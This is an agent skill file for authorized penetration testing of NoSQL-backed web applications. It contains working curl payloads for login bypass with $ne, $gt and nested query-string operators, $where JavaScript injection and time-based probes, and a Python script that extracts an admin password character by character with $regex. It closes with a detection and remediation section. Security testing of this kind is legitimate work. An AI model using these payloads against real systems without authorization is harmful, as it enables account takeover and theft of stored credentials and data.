---
name: nosql-injection
description: Use when testing NoSQL-backed applications (MongoDB, CouchDB,
  Redis) for injection on an authorized engagement. Covers detecting NoSQL
  backends, operator injection ($ne, $gt, $regex, $where) in JSON bodies and
  query strings, authentication bypass with $ne tricks, boolean blind
  extraction with $regex, JavaScript injection through $where, and automating
  extraction with Python 3.12. Use when login forms or search features talk
  to a document database, when JSON payloads accept query operators, or when
  classic SQL payloads fail but the backend is not relational.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [web-sqli, api-security-testing]
tools:
  - name: Burp Suite
    version: "2026.2"
  - name: Python
    version: "3.12"
---

NoSQL injection works like SQL injection one level up: instead of breaking
out of a query string, the attacker injects query operators or JavaScript
into the structured query the application builds from user input. A login
form that passes `{"user": input}` straight into a MongoDB `find()` can be
beaten with `{"user": {"$ne": null}}`, no quotes or comments required. This
skill covers the authorized methodology: fingerprinting the backend,
operator injection, authentication bypass, blind extraction, and JavaScript
injection through `$where`. All testing targets systems you have written
permission to test.

## Quick Workflow

1. Fingerprint the backend: error messages, response timing, technology
   headers, and how the app parses JSON bodies.
2. Test whether JSON values accept objects: replace a string value with
   `{"$ne": null}` and watch the behavior change.
3. Attempt authentication bypass on login forms with `$ne`, `$gt`, and
   `$regex` operators.
4. Test query string and form parameters too, not just JSON bodies.
5. Extract data blind with `$regex` character-by-character when output
   is not visible.
6. Probe `$where` for server-side JavaScript injection and escalate to
   time-based extraction.
7. Automate confirmed primitives with Python, keeping request rates low.
8. Record every payload, the exact response difference, and extracted
   values for the report.

## 1. Fingerprinting the NoSQL backend

Confirm the backend before choosing payloads. MongoDB, CouchDB, and
Redis each respond differently to malformed input.

```bash
# Send a broken JSON body and read the error (MongoDB leaks operator names)
curl -s -X POST 'https://target.example/api/login' \
  -H 'Content-Type: application/json' \
  -d '{"user": {"$bad": 1}, "pass": "x"}' | head -c 400
```

```bash
# Type juggling probe: array where a string is expected
curl -s -X POST 'https://target.example/api/login' \
  -H 'Content-Type: application/json' \
  -d '{"user": ["admin"], "pass": "x"}' | head -c 400
```

```bash
# Check response headers and cookies for backend hints
curl -si 'https://target.example/api/login' -X POST \
  -H 'Content-Type: application/json' \
  -d '{"user":"x","pass":"x"}' | grep -iE '^(x-powered-by|server):'
```

Useful signals: MongoDB error text mentioning `$where` or `BadValue`,
CouchDB's distinctive JSON error envelopes, timing differences when
operators are evaluated, and a 500 on objects-versus-strings where the
app passes input straight to the driver.

## 2. Operator injection in JSON bodies

If the application builds its query from the parsed JSON without
validating types, operators become injectable values.

```bash
# Authentication bypass: match any user whose name is not null
curl -s -X POST 'https://target.example/api/login' \
  -H 'Content-Type: application/json' \
  -d '{"user": {"$ne": null}, "pass": {"$ne": null}}' | head -c 400
```

```bash
# Target a specific account without knowing its password
curl -s -X POST 'https://target.example/api/login' \
  -H 'Content-Type: application/json' \
  -d '{"user": "admin", "pass": {"$ne": "wrong"}}' | head -c 400
```

```bash
# $gt variant: match any password greater than empty string
curl -s -X POST 'https://target.example/api/login' \
  -H 'Content-Type: application/json' \
  -d '{"user": "admin", "pass": {"$gt": ""}}' | head -c 400
```

A successful bypass returns the logged-in response (a session cookie, a
token, or a redirect to the dashboard). Save the full response and
confirm the session actually works by requesting a protected page with
it. If the app stringifies input before querying, operators arrive as
the literal string `{"$ne": null}` and nothing happens; that negative
result is still worth one line in the report.

## 3. Operator injection in query strings and forms

Some frameworks parse `?user[$ne]=` into nested objects, which brings
operator injection to GET parameters and form bodies.

```bash
# PHP-style nested parameter (Laravel, Express with qs parser)
curl -s 'https://target.example/api/users?user[$ne]=x' \
  -b 'session=YOUR_TEST_SESSION' | head -c 300

# Login via query string operators
curl -s 'https://target.example/api/login?user=admin&pass[$ne]=x' \
  | head -c 300
```

```bash
# Form-encoded nested operators
curl -s -X POST 'https://target.example/api/login' \
  -d 'user=admin&pass[$gt]=' | head -c 300
```

Test every input vector the app accepts: JSON, form-encoded, and query
strings often feed the same query builder through different parsers,
and only one of them may preserve the operator structure.

## 4. Boolean blind extraction with $regex

When login fails but the response differs between "user exists, wrong
password" and "user does not exist", extract data character by
character with `$regex`.

```bash
# Does the admin password start with 'a'? (true page vs false page differ)
curl -s -X POST 'https://target.example/api/login' \
  -H 'Content-Type: application/json' \
  -d '{"user": "admin", "pass": {"$regex": "^a"}}' | grep -c 'invalid password'
```

```python
#!/usr/bin/env python3
"""$regex blind extractor for MongoDB-backed logins (authorized only)."""
import urllib.request, json, string

URL = "https://target.example/api/login"
FALSE_MARKER = b"user not found"  # adjust to the app's false response

def ask(payload):
    body = json.dumps({"user": "admin", "pass": payload}).encode()
    req = urllib.request.Request(URL, data=body,
                                 headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=15) as r:
        return FALSE_MARKER not in r.read()

known = ""
alphabet = string.ascii_lowercase + string.digits + "_-!@#"
while len(known) < 40:
    found = False
    for c in alphabet:
        if ask({"$regex": f"^{known}{c}"}):
            known += c
            found = True
            print(f"[*] so far: {known}")
            break
    if not found:
        break
print(f"[+] extracted: {known}")
```

Anchor every regex with `^` and build on the known prefix so each
request tests exactly one new character. Add a small delay between
requests to stay polite.

## 5. JavaScript injection through $where

MongoDB's `$where` evaluates JavaScript on the server. If user input
reaches it, you get server-side code execution in the database
context.

```bash
# Probe: does $where evaluate? (true for every document)
curl -s -X POST 'https://target.example/api/search' \
  -H 'Content-Type: application/json' \
  -b 'session=YOUR_TEST_SESSION' \
  -d '{"q": {"$where": "return true"}}' | head -c 300
```

```bash
# String breakout: the app wraps input in quotes, break out of them
# Application builds: { $where: "this.name == '<INPUT>'" }
# Inject: ' || '1'=='1  to make the condition always true
curl -s -X POST 'https://target.example/api/search' \
  -H 'Content-Type: application/json' \
  -b 'session=YOUR_TEST_SESSION' \
  -d '{"q": "'"'"' || '"'"'1'"'"'=='"'"'1"}' | head -c 300
```

```bash
# Time-based confirmation: sleep 3 seconds inside $where
curl -s -X POST 'https://target.example/api/search' \
  -H 'Content-Type: application/json' \
  -b 'session=YOUR_TEST_SESSION' \
  -d '{"q": {"$where": "sleep(3000) || true"}}' -w '\n%{time_total}s\n' \
  -o /dev/null
```

A 3-second response against a normally instant endpoint confirms
JavaScript execution. From there, blind extraction uses conditional
sleep exactly like time-based SQL injection. Keep sleeps short and
stop at proof of execution: dumping the whole database through
`$where` is slow and noisy.

## 6. Extracting with error and timing channels

When `$regex` blind is too slow, look for louder channels:

- Error messages: some drivers echo the failing operator or the
  document that failed a cast. Feed `$where` type errors and read the
  response.
- Timing: `$where` with `sleep()` gated on a condition extracts one
  bit per request, same loop as section 4 but measuring seconds.
- Response size: `$regex` matches that return more documents produce
  measurably larger responses; binary-search on result count.

```bash
# Error channel probe: force a cast error that echoes data
curl -s -X POST 'https://target.example/api/search' \
  -H 'Content-Type: application/json' \
  -b 'session=YOUR_TEST_SESSION' \
  -d '{"q": {"$where": "this.password.length"}}' | head -c 300
```

Document which channel worked and its request cost, because the report
needs to justify the extraction method.

## 7. Other NoSQL backends

MongoDB is the most common target, but adjust payloads when the
fingerprint points elsewhere:

- CouchDB (HTTP API, MapReduce): inject into view keys and Mango
  selectors. Mango uses the same `$ne`, `$gt`, `$regex` operator
  syntax as MongoDB, so sections 2 to 4 transfer directly.
- Redis: no query language, but command injection where user input
  reaches `EVAL` or key names. Test keyspace traversal with `*` and
  `?` glob patterns in search features.
- Cassandra/Scylla (CQL): closer to SQL; quote-breaking payloads from
  classic injection apply, minus stacked queries.

Always re-fingerprint after a backend change; operator syntax that is
inert on one database is executable on another.

## Edge cases

- The app validates with a schema (Joi, Mongoose strict mode):
  operators may be stripped before the query. Test whether nested
  objects survive validation at all before investing in extraction.
- Input is stringified with `JSON.stringify` into a string field:
  operators become literal text, not injectable. Move on quickly.
- The driver version blocks `$where` (disabled by default in modern
  MongoDB configurations): sections 2 to 4 still apply.
- Rate limiting or account lockout on login: blind extraction through
  the login form can lock the test account. Prefer search or profile
  endpoints for extraction, or coordinate lockout resets.
- The false marker is unreliable (same page for both outcomes):
  switch to the timing channel in section 5 instead of boolean
  content differences.
- GraphQL resolvers building NoSQL queries: operators hide inside
  GraphQL arguments, so test the resolver inputs, not just REST.

## Escalation

- `$ne` bypass fails because the app checks the password hash in code:
  pivot to `$regex` extraction of the hash through a search endpoint,
  then crack it offline if the rules allow.
- Blind extraction is too slow: look for an error channel (section
  6) or a `$where` timing primitive to speed up bit recovery.
- `$where` is disabled: test aggregation pipeline injection
  (`$lookup`, `$group` stages built from input) on endpoints that
  expose aggregation.
- Operators are stripped from JSON: try query string nesting
  (section 3) and HTTP parameter pollution, which may take a
  different parsing path to the same query builder.
- Authentication bypass works but sessions are short-lived: chain
  immediately into password extraction via `$regex` so the finding
  stands on its own evidence.

## Detection and defender view

Defenders see NoSQL injection as `$ne`, `$gt`, `$regex`, `$where`, and
`sleep(` strings inside JSON request bodies and query parameters in
application logs, bursts of login attempts with object-valued fields,
and database profiler entries showing operator-heavy queries from the
application user. The durable fixes are schema validation that rejects
unexpected types (strings must be strings, never objects), an
allowlist of permitted query operators, disabling server-side
JavaScript (`$where`, `mapReduce`) unless strictly needed,
least-privilege database roles for the application, and parameterized
query builders instead of passing raw input to `find()`. A WAF can
block known operator strings, but type validation at the application
layer is the real fix.

## Key references

- MITRE ATT&CK T1190 (Exploit Public-Facing Application): the entry
  point class.
- CWE-943 (Improper Neutralization of Special Elements in Data Query
  Logic): the NoSQL injection weakness.
- CWE-20 (Improper Input Validation): the root cause class.
- OWASP Testing Guide: Testing for NoSQL Injection.
- MongoDB documentation: query operator reference and disabling
  server-side JavaScript.
- PortSwigger Web Security Academy: NoSQL injection labs.
